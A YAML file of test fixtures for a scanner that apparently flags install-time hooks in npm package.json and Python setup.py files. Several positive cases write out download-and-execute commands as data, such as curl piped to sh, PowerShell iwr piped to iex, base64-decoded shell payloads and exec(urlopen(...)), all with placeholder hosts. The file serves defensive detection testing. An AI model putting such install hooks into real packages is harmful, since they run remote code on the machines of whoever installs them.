# Test cases for area autorun. Files are created under tmp_path only; contents are
# harmless dummies with placeholder domains and are never executed.

RC-AUTO-001:
  positive:
    - name: postinstall script
      files:
        package.json: |
          {
            "name": "demo",
            "scripts": {
              "postinstall": "node scripts/setup.js"
            }
          }
      expect: [{path: package.json, line: 4}]
    - name: preinstall in a nested package
      files:
        packages/app/package.json: '{"scripts": {"preinstall": "echo hi"}}'
      expect: [{path: packages/app/package.json, line: 1}]
  negative:
    - name: only build and test scripts
      files:
        package.json: '{"name": "demo", "scripts": {"build": "tsc -p .", "test": "vitest"}}'
    - name: install script of a vendored dependency
      files:
        node_modules/dep/package.json: '{"scripts": {"install": "node-gyp rebuild"}}'
    - name: lifecycle names only appear as values
      files:
        package.json: '{"description": "postinstall", "scripts": {"lint": "echo postinstall"}}'

RC-AUTO-002:
  positive:
    - name: prepare script
      files:
        package.json: '{"scripts": {"prepare": "husky"}}'
      expect: [{path: package.json, line: 1}]
    - name: prepack script
      files:
        package.json: |
          {
            "scripts": {"prepack": "npm run build"}
          }
      expect: [{path: package.json, line: 2}]
  negative:
    - name: prepublishOnly is not run on install
      files:
        package.json: '{"scripts": {"prepublishOnly": "npm test", "build": "tsc"}}'

RC-AUTO-003:
  positive:
    - name: postinstall pipes a download into a shell
      files:
        package.json: |
          {
            "scripts": {
              "postinstall": "curl -s https://example.invalid/x.sh | sh"
            }
          }
      expect: [{path: package.json, line: 3}]
    - name: preinstall runs a PowerShell download
      files:
        package.json: '{"scripts": {"preinstall": "powershell -c \"iwr https://example.invalid/a.ps1 | iex\""}}'
      expect: [{path: package.json, line: 1}]
    - name: install decodes a payload
      files:
        package.json: '{"scripts": {"install": "echo ZWNobyBoaQ== | base64 -d | sh"}}'
      expect: [{path: package.json, line: 1}]
  negative:
    - name: postinstall runs a local script
      files:
        package.json: '{"scripts": {"postinstall": "node scripts/postinstall.js", "prepare": "husky"}}'
    - name: download in a script that is not a lifecycle script
      files:
        package.json: '{"scripts": {"health": "curl -s https://example.invalid/health"}}'

RC-AUTO-010:
  positive:
    - name: setup.py at the root
      files:
        setup.py: "from setuptools import setup\nsetup(name='demo')\n"
      expect: [{path: setup.py}]
    - name: setup.py in a subpackage
      files:
        python/setup.py: "from setuptools import setup\nsetup()\n"
      expect: [{path: python/setup.py}]
  negative:
    - name: only declarative configuration
      files:
        setup.cfg: "[metadata]\nname = demo\n"
        pyproject.toml: "[project]\nname = \"demo\"\n"
    - name: similar file names
      files:
        mysetup.py: "print('x')\n"
        docs/setup.py.txt: "setup()\n"

RC-AUTO-011:
  positive:
    - name: setup.py starts a process
      files:
        setup.py: |
          import subprocess
          subprocess.check_call(["make", "all"])
          from setuptools import setup
          setup(name="demo")
      expect: [{path: setup.py, line: 2}]
    - name: setup.py downloads and executes code
      files:
        setup.py: |
          from urllib.request import urlopen
          exec(urlopen("https://example.invalid/x.py").read())
      expect: [{path: setup.py, line: 2}]
    - name: setup.py decodes a payload via an alias
      files:
        setup.py: |
          import base64 as b
          code = b.b64decode("cHJpbnQoMSk=")
      expect: [{path: setup.py, line: 2}]
  negative:
    - name: plain setup with file reading
      files:
        setup.py: |
          import os
          from setuptools import setup
          with open(os.path.join(os.path.dirname(__file__), "README.md")) as fh:
              long_description = fh.read()
          setup(name="demo", long_description=long_description)
    - name: names only in strings and comments
      files:
        setup.py: |
          # subprocess.run is not used here
          from setuptools import setup
          setup(name="demo", description="no exec(), no eval()")

RC-AUTO-012:
  positive:
    - name: custom install command
      files:
        setup.py: |
          from setuptools import setup
          from setuptools.command.install import install
          class Install(install):
              pass
          setup(name="demo", cmdclass={"install": Install})
      expect: [{path: setup.py, line: 5}]
    - name: distutils setup with cmdclass
      files:
        setup.py: |
          import distutils.core
          distutils.core.setup(
              name="demo",
              cmdclass={},
          )
      expect: [{path: setup.py, line: 4}]
  negative:
    - name: setup without cmdclass
      files:
        setup.py: "from setuptools import setup\nsetup(name='demo')\n"
    - name: cmdclass keyword in another call
      files:
        setup.py: "def configure(**kw):\n    return kw\nconfigure(cmdclass=None)\n"

RC-AUTO-013:
